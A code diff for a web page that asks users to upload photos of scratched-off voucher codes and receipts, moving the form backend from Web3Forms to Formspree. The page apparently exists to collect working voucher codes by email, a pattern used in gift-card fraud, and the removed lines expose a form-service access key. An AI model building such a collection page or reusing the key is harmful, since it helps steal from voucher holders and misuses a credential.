@@ -28,19 +28,14 @@
                 Voucher Image Submission
             </h1>
             <p class="text-gray-500 text-sm sm:text-base">
-                Directly upload your images for processing.
+                Directly upload your images to the Formspree backend.
             </p>
         </header>
 
-        <!-- The entire application is now a single HTML form -->
-        <form action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" id="submissionForm" onsubmit="handleSubmission(event)">
+        <!-- The application is now a Formspree submission form -->
+        <form action="https://formspree.io/f/mqagkkvn" method="POST" enctype="multipart/form-data" id="submissionForm" onsubmit="handleSubmission(event)">
             
-            <!-- Hidden Fields for Web3Forms Configuration -->
-            <input type="hidden" name="access_key" value="911e988a-6472-4daa-be29-4b4da9696d45">
-            <input type="hidden" name="subject" value="New Direct Image Submission">
-            <input type="hidden" name="from_name" value="Voucher Submission App">
-            <input type="hidden" name="redirect" value="https://web3forms.com/success">
-            <input type="hidden" name="Message" value="Images attached for verification.">
+            <!-- Removed the explicit email input field -->
             
             <!-- Image Upload Section -->
             <section class="mb-8">
@@ -48,8 +43,8 @@
                 <p class="text-sm text-red-500 font-semibold mb-4 p-2 bg-red-50 rounded-lg">
                     ⚠️ **Instruction:** The voucher code must be scratched. Upload all necessary files (e.g., Voucher photo, Receipt photo) in a single selection.
                 </p>
-                <!-- NOTE: The 'name' attribute is crucial for Web3Forms to receive the files -->
-                <input type="file" id="imageUpload" name="uploaded_files[]" accept="image/*" multiple required
+                <!-- NOTE: 'name' is 'upload' for Formspree file attachments -->
+                <input type="file" id="imageUpload" name="upload" accept="image/*" multiple required
                     class="w-full text-sm text-gray-500
                         file:mr-4 file:py-3 file:px-5
                         file:rounded-full file:border-0
@@ -58,6 +53,9 @@
                         hover:file:bg-violet-100 transition duration-150"
                     onchange="previewImages(event)">
                 
+                <!-- Hidden message field for clarity in the email -->
+                <input type="hidden" name="message" value="Images attached for verification via Formspree.">
+
                 <!-- Image Preview Area -->
                 <div id="imagePreviewContainer" class="mt-4 p-3 bg-gray-100 rounded-lg hidden flex flex-wrap gap-2">
                     <!-- Previews will be dynamically inserted here -->
@@ -132,7 +130,6 @@
                 // Temporarily disable the button to prevent double-clicks
                 document.getElementById('submitButton').disabled = true;
             }
-            // If files exist, the form is allowed to submit natively and redirect.
         }
 
         // --- Message Display Functions ---
